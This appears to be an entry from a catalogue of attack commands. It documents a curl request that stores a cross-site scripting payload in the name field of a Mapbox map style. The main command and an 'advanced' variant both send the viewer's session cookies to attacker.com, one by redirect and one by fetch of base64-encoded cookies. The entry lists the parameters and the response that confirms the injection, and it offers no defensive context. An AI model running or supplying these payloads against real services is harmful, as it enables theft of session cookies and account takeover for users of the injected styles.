---
id: cmd-curl-post-mapbox
data: >-
  curl -X POST
  "https://api.mapbox.com/styles/v1/{username}/{style_id}?access_token={your_token}"
  -H "Content-Type: application/json" -d '{"name": "<script>alert(\"XSS\");
  document.location=\"http://attacker.com?cookie=\"+document.cookie;</script>"}'
tags:
  - http
  - api
  - xss
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:52:55.316Z'
verified: false
validated: true
submitted: true
---
# curl-post-styles-payload

## Command

```bash
curl -X POST "https://api.mapbox.com/styles/v1/{username}/{style_id}?access_token={your_token}" -H "Content-Type: application/json" -d '{"name": "<script>alert(\"XSS\"); document.location=\"http://attacker.com?cookie=\"+document.cookie;</script>"}'
```

## Description

This command uses curl to POST a JSON payload to the Mapbox Styles API, injecting a stored XSS script into the name field for persistence.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `URL` | API endpoint with placeholders for username, style_id, token | Yes |
| `-H "Content-Type: application/json"` | Sets JSON content type | Yes |
| `-d '{...}'` | JSON body with malicious name | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://api.mapbox.com/styles/v1/user/style1?access_token=pk.ey..." -H "Content-Type: application/json" -d '{"name": "<script>alert(\"XSS\")</script>"}'
```

### Advanced Usage

```bash
curl -X POST "https://api.mapbox.com/styles/v1/user/style1?access_token=pk.ey..." -H "Content-Type: application/json" -d '{"name": "<script>fetch(\"http://attacker.com?data=\"+btoa(document.cookie))</script>", "version": 1}'
```

## Expected Output

HTTP 200 OK with JSON response like {"id":"mapbox://styles/user/style1","name":"<script>...</script>",...}, confirming injection.

## Related

- [[Related Procedure]]
